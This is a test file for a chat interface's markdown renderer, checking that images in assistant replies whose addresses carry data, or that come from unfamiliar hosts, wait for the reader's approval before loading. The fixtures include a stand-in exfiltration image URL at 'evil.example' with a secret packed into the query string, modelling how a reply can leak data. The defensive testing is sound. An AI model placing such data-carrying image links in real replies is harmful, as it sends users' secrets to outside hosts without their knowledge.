import { afterEach, expect, test } from "bun:test";
import { act } from "react";
import { createRoot, type Root } from "react-dom/client";
import { TextMessagePartProvider } from "@assistant-ui/react";

import { installDom } from "@/test/dom";
import { IMAGE_PROMPT_COPY } from "@/lib/imageUrlFilter";
import { MarkdownText } from "./markdown-text";

let restore: (() => void) | undefined;
let mounted: Root | undefined;
afterEach(() => {
  if (mounted) act(() => mounted!.unmount());
  mounted = undefined;
  restore?.();
  restore = undefined;
});

async function show(root: Root, text: string, host: HTMLElement, isRunning = false) {
  const deadline = Date.now() + 3000;
  await act(async () =>
    root.render(
      <TextMessagePartProvider text={text} isRunning={isRunning}>
        <MarkdownText />
      </TextMessagePartProvider>,
    ),
  );
  // The Markdown primitive reveals new text a few characters per animation frame: wait until the page stops changing.
  let last = "";
  for (let stable = 0; stable < 4 && Date.now() < deadline; ) {
    await act(async () => { await Bun.sleep(20); });
    stable = host.innerHTML === last ? stable + 1 : 0;
    last = host.innerHTML;
  }
}

async function reply(text: string) {
  restore = installDom();
  const host = document.createElement("div");
  document.body.append(host);
  mounted = createRoot(host);
  await show(mounted, text, host);
  return host;
}

const carrier = `https://evil.example/p.png?d=${"secret".repeat(14)}`;
const click = (button: Element) => act(async () => { (button as HTMLElement).click(); });
const buttonNamed = (host: HTMLElement, name: string) =>
  [...host.querySelectorAll("button")].find((b) => b.textContent === name)!;
const IMAGE_ADDRESS = (tail: string) => `https://evil.example/p.png?d=${"secret".repeat(14)}${tail}`;

test("a reply's normal image loads without asking", async () => {
  const host = await reply("![logo](https://i.imgur.com/AbCd123.png)");
  expect(host.querySelector("img")?.getAttribute("src")).toBe("https://i.imgur.com/AbCd123.png");
  expect(host.querySelector("button")).toBeNull();
});

test("an image address that carries data shows the host and full address, with no img until Load", async () => {
  const host = await reply(`![chart](${carrier})`);
  expect(host.querySelector("img")).toBeNull();
  expect(host.textContent).toContain(IMAGE_PROMPT_COPY.title("evil.example"));
  expect(host.textContent).toContain(IMAGE_PROMPT_COPY.why("evil.example"));
  expect(host.textContent).toContain(carrier);
  await click(buttonNamed(host, IMAGE_PROMPT_COPY.load));
  expect(host.querySelector("img")?.getAttribute("src")).toBe(carrier);
});

test("Not now leaves the image's description and no img", async () => {
  const host = await reply(`![chart](${carrier})`);
  await click(buttonNamed(host, IMAGE_PROMPT_COPY.notNow));
  expect(host.querySelector("img")).toBeNull();
  expect(host.querySelector("button")).toBeNull();
  expect(host.textContent).toContain(IMAGE_PROMPT_COPY.notLoaded("chart"));
});

test("a data: image never loads and never asks", async () => {
  const host = await reply("![dot](data:image/png;base64,iVBORw0KGgo=)");
  expect(host.querySelector("img")).toBeNull();
  expect(host.querySelector("button")).toBeNull();
});

test("a link in a reply sends no referrer and no opener", async () => {
  const host = await reply("[docs](https://example.com/docs)");
  const link = host.querySelector("a")!;
  expect(link.getAttribute("href")).toBe("https://example.com/docs");
  expect(link.getAttribute("rel")?.split(" ").sort()).toEqual(["nofollow", "noopener", "noreferrer"]);
  expect(link.getAttribute("referrerpolicy")).toBe("no-referrer");
});

test("an image that loads sends no referrer", async () => {
  const host = await reply(`![chart](https://i.imgur.com/AbCd123.png)\n\n![big](${carrier})`);
  expect(host.querySelector("img")?.getAttribute("referrerpolicy")).toBe("no-referrer");
  await click(buttonNamed(host, IMAGE_PROMPT_COPY.load));
  expect([...host.querySelectorAll("img")].map((i) => i.getAttribute("referrerpolicy"))).toEqual(["no-referrer", "no-referrer"]);
});

test("Load approves the address the reader saw: if the address changes under the same image, it asks again", async () => {
  const a = IMAGE_ADDRESS("A");
  const b = IMAGE_ADDRESS("B");
  const host = await reply(`![chart](${a})`);
  await click(buttonNamed(host, IMAGE_PROMPT_COPY.load));
  expect(host.querySelector("img")?.getAttribute("src")).toBe(a);
  await show(mounted!, `![chart](${b})`, host);
  expect(host.querySelector("img")).toBeNull();
  expect(host.textContent).toContain(b);
  await click(buttonNamed(host, IMAGE_PROMPT_COPY.load));
  expect(host.querySelector("img")?.getAttribute("src")).toBe(b);
});

const photo = (host: string, name = "p") => `![${name}](https://${host}/${name}.png)`;
const imageCount = (host: HTMLElement) => host.querySelectorAll("img").length;

test("a reply's images from other hosts: two load, the rest wait for one prompt for the whole reply", async () => {
  const host = await reply(["a.example", "b.example", "c.example", "d.example"].map((h) => photo(h)).join("\n\n"));
  expect(imageCount(host)).toBe(2);
  expect(host.textContent).toContain(IMAGE_PROMPT_COPY.notLoaded("p"));
  expect(host.textContent).toContain(IMAGE_PROMPT_COPY.more.title(2, ["c.example", "d.example"]));
  expect(host.textContent).toContain(IMAGE_PROMPT_COPY.more.why);
  expect(host.querySelectorAll("button").length).toBe(2); // one prompt: Load and Not now
  await click(buttonNamed(host, IMAGE_PROMPT_COPY.load));
  expect(imageCount(host)).toBe(4);
  expect(host.querySelector("button")).toBeNull();
});

test("Not now on the reply's prompt leaves the held images as descriptions and asks no more", async () => {
  const host = await reply(["a", "b", "c", "d"].map((h) => photo(`${h}.example`)).join("\n\n"));
  await click(buttonNamed(host, IMAGE_PROMPT_COPY.notNow));
  expect(imageCount(host)).toBe(2);
  expect(host.querySelector("button")).toBeNull();
  expect(host.textContent).toContain(IMAGE_PROMPT_COPY.notLoaded("p"));
});

test("our own hosts do not use the reply's budget", async () => {
  const own = [1, 2, 3, 4].map((n) => photo("node.tinycloud.xyz", `n${n}`)).join("\n\n");
  const host = await reply(`${own}\n\n${photo("a.example")}\n\n${photo("b.example")}`);
  expect(imageCount(host)).toBe(6);
  expect(host.querySelector("button")).toBeNull();
});

test("an approval covers the addresses it named: an image added to the reply afterwards waits again", async () => {
  const four = ["a", "b", "c", "d"].map((h) => photo(`${h}.example`)).join("\n\n");
  const host = await reply(four);
  await click(buttonNamed(host, IMAGE_PROMPT_COPY.load));
  expect(imageCount(host)).toBe(4);
  await show(mounted!, `${four}\n\n${photo("e.example")}`, host);
  expect(imageCount(host)).toBe(4);
  expect(host.textContent).toContain(IMAGE_PROMPT_COPY.more.title(1, ["e.example"]));
});

const srcs = (host: HTMLElement) => [...host.querySelectorAll("img")].map((img) => img.getAttribute("src"));

test("while a reply streams, no image from another host loads; the silent two are chosen from the finished text, in document order", async () => {
  const text = [
    "![a][r]",
    photo("b.example", "b"),
    photo("c.example", "c"),
    photo("node.tinycloud.xyz", "own"),
    "[r]: https://evil.example/real.png",
  ].join("\n\n");
  restore = installDom();
  const host = document.createElement("div");
  document.body.append(host);
  mounted = createRoot(host);

  // A reference definition arriving character by character: every prefix that parses as an address is a different image.
  for (const prefix of [text.slice(0, text.indexOf("[r]:") + 14), text.slice(0, text.indexOf("[r]:") + 21), text]) {
    await show(mounted, prefix, host, true);
    expect(srcs(host)).toEqual(prefix.includes("own") ? ["https://node.tinycloud.xyz/own.png"] : []);
    expect(host.textContent).not.toContain("more image");
  }

  await show(mounted, text, host, false);
  const settled = srcs(host);
  expect(settled).toEqual(["https://evil.example/real.png", "https://b.example/b.png", "https://node.tinycloud.xyz/own.png"]);
  expect(host.textContent).toContain(IMAGE_PROMPT_COPY.more.title(1, ["c.example"]));

  // Reopening the reply decides the same two, whatever happened while it streamed.
  act(() => mounted!.unmount());
  host.remove();
  const reopened = document.createElement("div");
  document.body.append(reopened);
  mounted = createRoot(reopened);
  await show(mounted, text, reopened, false);
  expect(srcs(reopened)).toEqual(settled);
  expect(reopened.textContent).toContain(IMAGE_PROMPT_COPY.more.title(1, ["c.example"]));
});

test("an address that asks shows no prompt for half a reply: it waits until the text is final", async () => {
  restore = installDom();
  const host = document.createElement("div");
  document.body.append(host);
  mounted = createRoot(host);
  await show(mounted, `![chart](${carrier})`, host, true);
  expect(host.querySelector("button")).toBeNull();
  expect(host.querySelector("img")).toBeNull();
  await show(mounted, `![chart](${carrier})`, host, false);
  expect(host.textContent).toContain(IMAGE_PROMPT_COPY.title("evil.example"));
});

// Every address an <img> ever had, not only the final page: a transient load is a request.
function recordSrcs() {
  const ever: string[] = [];
  const original = Element.prototype.setAttribute;
  Element.prototype.setAttribute = function (this: Element, name: string, value: string) {
    if (this.tagName === "IMG" && name === "src") ever.push(value);
    return original.call(this, name, value);
  };
  return { ever, stop: () => { Element.prototype.setAttribute = original; } };
}

async function mountRecorded() {
  restore = installDom();
  const recorder = recordSrcs();
  const host = document.createElement("div");
  document.body.append(host);
  mounted = createRoot(host);
  const stop = restore;
  restore = () => { recorder.stop(); stop(); };
  return { host, ever: recorder.ever };
}

const four = (...names: string[]) => names.map((n) => photo(`${n}.example`, n)).join("\n\n");
const loaded = (...names: string[]) => names.map((n) => `https://${n}.example/${n}.png`);

test("a finished reply loads its first two images and no other address is ever requested, not even once", async () => {
  const { host, ever } = await mountRecorded();
  await show(mounted!, four("a", "b", "c", "d"), host, false);
  expect(new Set(ever)).toEqual(new Set(loaded("a", "b")));
});

test("an address changed in place while the reply is finished keeps its slot: no held image takes it", async () => {
  const { host, ever } = await mountRecorded();
  await show(mounted!, four("a", "b", "c", "d"), host, false);
  await show(mounted!, four("x", "b", "c", "d"), host, false);
  await show(mounted!, four("y", "b", "c", "d"), host, false);
  expect(new Set(ever)).toEqual(new Set(loaded("a", "b", "x", "y")));
  expect(srcs(host)).toEqual(loaded("y", "b"));
  expect(host.textContent).toContain(IMAGE_PROMPT_COPY.more.title(2, ["c.example", "d.example"]));
});

test("images that go away give their slots up: no prompt is left for an image that is no longer there", async () => {
  const { host } = await mountRecorded();
  await show(mounted!, four("a", "b", "c", "d"), host, false);
  expect(host.textContent).toContain("more images");
  await show(mounted!, four("d"), host, false);
  expect(srcs(host)).toEqual(loaded("d"));
  expect(host.textContent).not.toContain("more image");
  expect(host.querySelector("button")).toBeNull();
});
